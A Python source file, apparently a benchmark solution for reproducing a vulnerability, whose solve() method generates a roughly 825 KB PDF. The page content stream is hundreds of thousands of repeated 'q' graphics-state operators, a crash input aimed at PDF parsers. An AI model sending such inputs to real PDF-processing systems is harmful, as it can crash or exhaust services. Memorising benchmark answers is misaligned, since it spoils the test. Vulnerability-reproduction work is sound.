class Solution:
    def solve(self, src_path: str) -> bytes:
        target_length = 825339
        parts = []
        header = b"%PDF-1.4\n"
        parts.append(header)
        current_offset = len(header)
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n"
        parts.append(obj1)
        current_offset += len(obj1)
        offset1 = current_offset - len(obj1)
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n"
        parts.append(obj2)
        current_offset += len(obj2)
        offset2 = current_offset - len(obj2)
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n\n"
        parts.append(obj3)
        current_offset += len(obj3)
        offset3 = current_offset - len(obj3)
        offset4 = current_offset
        xref_entries = b"0000000000 65535 f \n"
        for off in [offset1, offset2, offset3, offset4]:
            xref_entries += f"{off:010d}".encode('ascii') + b" 00000 n \n"
        trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
        xref = b"xref\n0 5\n" + xref_entries + trailer
        len_xref = len(xref)
        fixed_pre = current_offset
        assumed_number_len = 6
        len_length_str = 22
        len_post_content = 19
        startxref_prefix = b"startxref\n"
        eof = b"%%EOF\n"
        len_start = len(startxref_prefix) + assumed_number_len + len(eof)
        fixed_part = fixed_pre + 9 + len_length_str + 7 + len_post_content + len_xref + len_start
        content_len = target_length - fixed_part
        if content_len < 0:
            content_len = 0
        xref_start = fixed_pre + 9 + len_length_str + 7 + content_len + len_post_content
        actual_number_len = len(str(xref_start))
        if actual_number_len != assumed_number_len:
            content_len += (assumed_number_len - actual_number_len)
            xref_start = fixed_pre + 9 + len_length_str + 7 + content_len + len_post_content
        unit = b'q '
        unit_len = len(unit)
        num_units = content_len // unit_len
        content = unit * num_units
        actual_content_len = len(content)
        length_str = f"<< /Length {actual_content_len} >>\n".encode('ascii')
        parts.append(b"4 0 obj\n")
        parts.append(length_str)
        parts.append(b"stream\n")
        parts.append(content)
        parts.append(b"endstream\nendobj\n\n")
        parts.append(xref)
        startxref_line = f"startxref\n{xref_start}\n%%EOF".encode('ascii')
        parts.append(startxref_line)
        pdf = b"".join(parts)
        return pdf